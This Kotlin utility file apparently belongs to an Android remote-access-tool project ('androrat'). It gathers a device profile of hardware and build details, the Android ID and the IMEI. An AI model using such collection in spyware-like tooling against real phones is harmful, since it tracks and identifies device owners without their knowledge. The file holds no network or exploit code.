package com.ierusalem.androrat.core.utils

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.telephony.TelephonyManager
import androidx.core.app.ActivityCompat

@SuppressLint("HardwareIds")
fun Context.getSystemDetails():String {

    val imei = getIMEI() ?: "Permission Not Granted"

    return "Brand: ${Build.BRAND} \n" +
            "DeviceID: ${
                Settings.Secure.getString(
                    this.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
            } \n" +
            "Model: ${Build.MODEL} \n" +
            "ID: ${Build.ID} \n" +
            "SDK: ${Build.VERSION.SDK_INT} \n" +
            "Manufacture: ${Build.MANUFACTURER} \n" +
            "Hardware: ${Build.HARDWARE} \n" +
            "Bootloader: ${Build.BOOTLOADER} \n" +
            "User: ${Build.USER} \n" +
            "Type: ${Build.TYPE} \n" +
            "Base: ${Build.VERSION_CODES.BASE} \n" +
            "Incremental: ${Build.VERSION.INCREMENTAL} \n" +
            "Board: ${Build.BOARD} \n" +
            "Host: ${Build.HOST} \n" +
            "FingerPrint: ${Build.FINGERPRINT} \n" +
            "Display: ${Build.DISPLAY} \n" +
            "IMEI: $imei \n" +
            "Version Code: ${Build.VERSION.RELEASE}"
}

fun checkPhoneStatePermission(context: Context): Boolean {
    return ActivityCompat.checkSelfPermission(
        context,
        Manifest.permission.READ_PHONE_STATE
    ) == PackageManager.PERMISSION_GRANTED
}

@SuppressLint("MissingPermission", "HardwareIds")
fun Context.getIMEI(): String? {
    if (checkPhoneStatePermission(this)) {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            telephonyManager.imei  // For Android 8.0 and above
        } else {
            telephonyManager.deviceId  // For devices below Android 8.0
        }
    }
    return null // Return null if permission is not granted
}